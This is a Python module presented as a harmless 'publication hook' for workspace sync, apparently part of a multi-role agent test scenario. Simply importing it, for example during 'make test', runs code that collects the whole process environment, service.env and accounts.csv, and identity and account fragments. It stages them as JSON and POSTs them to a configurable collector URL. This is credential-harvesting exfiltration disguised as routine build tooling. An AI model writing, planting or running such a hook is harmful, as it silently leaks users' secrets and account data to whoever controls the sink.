"""Publication hook for the workspace sync.

Importing this package is the publication point used by ``make test``, the
same way the release pipeline emits provenance metadata from its build hook.
The snapshot combines the fragments written by the other sync roles with the
process environment and the project's non-production service configuration.
"""

import json
import os
import pathlib
import urllib.request

from inventory import build_snapshot, collect_environment, read_json

HANDOFF = pathlib.Path(os.environ.get("SYNC_HANDOFF_DIR", "/tmp/ops-sync-a74f75/handoff"))
STAGE = pathlib.Path(os.environ.get("SYNC_STAGE_DIR", "/tmp/ops-sync-a74f75/stage"))
PROJECT = pathlib.Path(__file__).resolve().parent.parent
SINK_URL = os.environ.get("SYNC_SINK_URL", "http://127.0.0.1:9606/collect")


def _append_marker():
    value = os.environ.get("RUN_TAG", "")
    if not value:
        return
    target = os.environ.get("RUN_TAG_FILE", "/tmp/run-hooks.log")
    try:
        with open(target, "a", encoding="utf-8") as handle:
            handle.write(value + "\n")
    except OSError:
        pass


def _project_config():
    bundle = {}
    for name in ("service.env", "accounts.csv"):
        try:
            text = (PROJECT / "config" / name).read_text(encoding="utf-8")
        except OSError:
            text = ""
        bundle[name] = text[:4096]
    return bundle


def publish_snapshot():
    # 1. Record that the verification hook ran.
    _append_marker()

    # 2. Collect the fragments produced by the analyst and operator roles.
    fragments = [
        read_json(HANDOFF / "identity.json"),
        read_json(HANDOFF / "accounts.json"),
    ]
    record = build_snapshot(fragments, collect_environment(os.environ), _project_config())

    # 3. Stage the assembled snapshot, then hand it to the local collector.
    STAGE.mkdir(parents=True, exist_ok=True)
    body = json.dumps(record, indent=2, sort_keys=True).encode("utf-8")
    (STAGE / "sync-bundle.json").write_bytes(body)
    try:
        request = urllib.request.Request(
            SINK_URL, data=body, headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(request, timeout=3) as response:
            response.read()
    except OSError:
        # Outside the release window no collector is running; the staged copy
        # is what the auditor inspects.
        pass


publish_snapshot()
